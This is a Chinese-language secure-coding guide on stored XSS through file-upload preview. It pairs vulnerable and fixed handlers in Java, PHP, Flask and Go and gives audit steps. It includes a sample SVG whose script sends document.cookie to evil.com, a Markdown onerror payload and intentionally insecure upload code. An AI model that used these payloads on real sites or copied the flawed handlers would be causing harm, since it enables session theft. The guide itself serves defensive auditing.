# 文件上传后预览执行（File Upload to Stored XSS via Preview）

## 攻击链概述

用户上传含恶意脚本的文件（SVG / HTML / Markdown / Office）→ 服务端存储到磁盘或对象存储 → 在线预览功能将文件内容作为 HTML 返回或嵌入 DOM → 浏览器执行文件中的脚本。

**区别于普通文件上传漏洞**：这里的危害不是 webshell 执行（服务端），而是通过预览功能在**浏览器端**执行脚本（客户端 XSS）。即使服务端不执行上传文件，只要预览链路将内容以 HTML 形式呈现，就构成存储型 XSS。

## 通用代码示例

### Java Spring — SVG 上传 + 直接预览

```java
// ❌ 上传：只校验扩展名，允许 SVG
@PostMapping("/upload")
public Result upload(@RequestParam MultipartFile file) {
    String ext = FilenameUtils.getExtension(file.getOriginalFilename());
    if (!Arrays.asList("jpg", "png", "gif", "svg").contains(ext)) {
        return Result.error("不支持的文件类型");
    }
    String path = uploadDir + "/" + UUID.randomUUID() + "." + ext;
    file.transferTo(new File(path));
    return Result.ok(path);
}

// ❌ 预览：直接返回文件内容，Content-Type 跟随文件类型
@GetMapping("/preview/{filename}")
public void preview(@PathVariable String filename, HttpServletResponse response) throws IOException {
    File file = new File(uploadDir + "/" + filename);
    String contentType = Files.probeContentType(file.toPath()); // SVG → image/svg+xml
    response.setContentType(contentType);
    Files.copy(file.toPath(), response.getOutputStream());
}
```

恶意 SVG 内容：

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
</svg>
```

```java
// ✅ 安全写法：SVG 预览时强制 Content-Disposition: attachment 或转为安全格式
@GetMapping("/preview/{filename}")
public void preview(@PathVariable String filename, HttpServletResponse response) throws IOException {
    File file = new File(uploadDir + "/" + filename);
    String ext = FilenameUtils.getExtension(filename);
    if ("svg".equalsIgnoreCase(ext) || "html".equalsIgnoreCase(ext)) {
        response.setHeader("Content-Disposition", "attachment; filename=\"" + filename + "\"");
        response.setContentType("application/octet-stream");
    } else {
        response.setContentType(Files.probeContentType(file.toPath()));
    }
    response.setHeader("X-Content-Type-Options", "nosniff");
    response.setHeader("Content-Security-Policy", "default-src 'none'");
    Files.copy(file.toPath(), response.getOutputStream());
}
```

### PHP — HTML 文件上传 + 直接访问

```php
// ❌ 上传 HTML 文件到静态目录
$target = "uploads/" . basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $target);

// 用户访问 /uploads/evil.html 时，浏览器直接执行其中的 <script>
```

```php
// ✅ 安全写法：禁止上传 HTML/SVG，或上传到非 Web 可达目录
$ext = strtolower(pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION));
$forbidden = ['html', 'htm', 'svg', 'xml', 'xhtml'];
if (in_array($ext, $forbidden)) {
    die("不允许上传此类文件");
}
```

### Python Flask — Markdown 文件上传 + 预览渲染

```python
# ❌ 上传 Markdown 并直接渲染为 HTML 预览
@app.route('/upload-md', methods=['POST'])
@login_required
def upload_markdown():
    f = request.files['file']
    path = os.path.join(UPLOAD_DIR, secure_filename(f.filename))
    f.save(path)
    return jsonify({"id": save_to_db(path)})

@app.route('/preview-md/<int:file_id>')
def preview_markdown(file_id):
    path = get_file_path(file_id)
    with open(path) as f:
        md_content = f.read()
    # markdown 库默认允许原始 HTML
    html = markdown.markdown(md_content)
    return render_template_string('<div class="preview">{{ content|safe }}</div>', content=html)
```

恶意 Markdown 内容：

```markdown
# Normal Title

<img src=x onerror="alert(document.cookie)">
```

```python
# ✅ 渲染后用 bleach 清洗
import bleach
html = markdown.markdown(md_content)
safe_html = bleach.clean(html, tags=['h1','h2','h3','p','a','em','strong','code','pre','ul','ol','li'],
                         attributes={'a': ['href']})
return render_template_string('<div class="preview">{{ content|safe }}</div>', content=safe_html)
```

### Go Gin — 上传文件直接静态服务

```go
// ❌ 上传目录直接映射为静态资源
func main() {
    r := gin.Default()
    r.POST("/upload", handleUpload)
    r.Static("/files", "./uploads") // 用户可直接访问 /files/evil.svg
    r.Run()
}

// ✅ 安全写法：通过 handler 控制 Content-Type 和安全头
func serveFile(c *gin.Context) {
    filename := c.Param("name")
    filepath := path.Join("./uploads", filepath.Base(filename))
    c.Header("X-Content-Type-Options", "nosniff")
    c.Header("Content-Security-Policy", "default-src 'none'")
    ext := strings.ToLower(path.Ext(filename))
    if ext == ".svg" || ext == ".html" || ext == ".htm" {
        c.Header("Content-Disposition", "attachment")
        c.Header("Content-Type", "application/octet-stream")
    }
    c.File(filepath)
}
```

## 高危文件类型

| 文件类型 | MIME Type | XSS 向量 |
|---------|-----------|----------|
| SVG | `image/svg+xml` | `<script>` 标签、`onload`/`onerror` 事件属性 |
| HTML/HTM | `text/html` | 任意 HTML + JS |
| XHTML | `application/xhtml+xml` | 同 HTML |
| Markdown | 渲染后变 `text/html` | 内嵌原始 HTML 标签 |
| XML/XSLT | `text/xml` | 脚本节点、样式表注入 |

## 识别信号

| 信号 | 说明 |
|------|------|
| 上传白名单包含 `svg` / `html` / `md` | 这些格式在浏览器中可执行脚本 |
| 上传目录映射为静态资源（`r.Static()` / `<mvc:resources>` / Apache DirectoryIndex） | 浏览器直接访问上传文件 |
| 预览接口返回 Content-Type 跟随文件本身类型 | `image/svg+xml` 允许浏览器解析 SVG 中的脚本 |
| 缺少 `X-Content-Type-Options: nosniff` | 浏览器可能对 Content-Type 做 MIME 嗅探 |
| 缺少 `Content-Security-Policy` | 无 CSP 限制预览页面中的脚本执行 |

## 审计方法

1. **枚举上传接口**：搜索 `MultipartFile` / `$_FILES` / `request.files` / `c.FormFile` 等上传入口
2. **检查文件类型白名单**：确认是否允许 SVG / HTML / Markdown / XML 等可执行格式
3. **追踪文件存储位置**：存储到 Web 可达的静态目录？还是非 Web 目录通过 handler 下发？
4. **检查预览/下载接口**：返回的 Content-Type 是否跟随文件类型？是否设置了 `Content-Disposition: attachment`？是否有 CSP 头？
5. **检查 Markdown/富文本渲染**：上传的 Markdown 文件渲染为 HTML 时，是否允许原始 HTML 标签？渲染后是否经过 sanitizer？
